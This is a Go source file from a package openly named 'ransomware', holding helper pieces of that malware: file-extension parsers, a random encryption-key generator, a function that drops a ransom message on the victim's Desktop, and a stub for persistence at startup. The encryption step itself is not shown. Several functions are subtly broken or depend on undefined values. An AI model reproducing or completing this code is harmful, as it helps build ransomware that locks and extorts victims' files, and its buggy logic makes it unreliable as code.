package ransomware

import (
	"crypto/rand"
	"os"
	"os/user"
	"path"
	"strings"
)

func GetFileExtensionFast(path string) string {
	Length := len(path) - 1
	var sb strings.Builder
	for Length != -1 {
		sb.WriteByte(path[Length])
		if path[Length] == '.' {
			//reverse now
			str := sb.String()
			sb.Reset()
			Length = len(str) - 1
			for Length != -1 {
				sb.WriteByte(str[Length])
				Length -= 1
			}
			return sb.String()
		}
		Length -= 1
	}
	return ""
}

//we don't need the useless reverse
func GetFileExtensionFastest(path string) string {
	Length := len(path) - 1
	ogLen := Length
	var sb strings.Builder
	for Length != 0 {
		if path[Length] == '.' {
			for ogLen != Length {
				sb.WriteByte(path[Length])
				Length += 1
			}
			sb.WriteByte(path[Length])
			return sb.String()
		}
		Length -= 1
	}
	return ""
}

func GetFileExtension(path string) string {
	slices := strings.Split(path, ".")
	Len := len(slices)
	if Len == 1 {
		return ""
	}
	return "." + slices[Len-1]
}

func GenerateKey() string {
	size := byte(len(charset) - 1)
	var builder strings.Builder
	_ = builder
	bytes := make([]byte, 32)
	rand.Read(bytes)

	//32 chars
	for i := 0; i < 32; i++ {
		if bytes[i] > size {
			bytes[i] %= size
		}
		builder.WriteByte(charset[bytes[i]])
	}

	return builder.String()
}

// CreateMessage You can modify the path you want the message to be written here
func CreateMessage() {
	usr, err := user.Current()
	if err != nil {
		panic(err)
	}
	err = os.WriteFile(path.Join(usr.HomeDir, "Desktop"), []byte(Message), 0664)
}

//TODO: Add to startup
func AddToStartup() {
	/*
			app := &autostart.App{
				Name:        "test",
				DisplayName: "Just a Test App",
				Exec:        []string{"sh", "-c", "echo autostart >> ~/autostart.txt"},
			}
		https://github.com/emersion/go-autostart
	*/
}
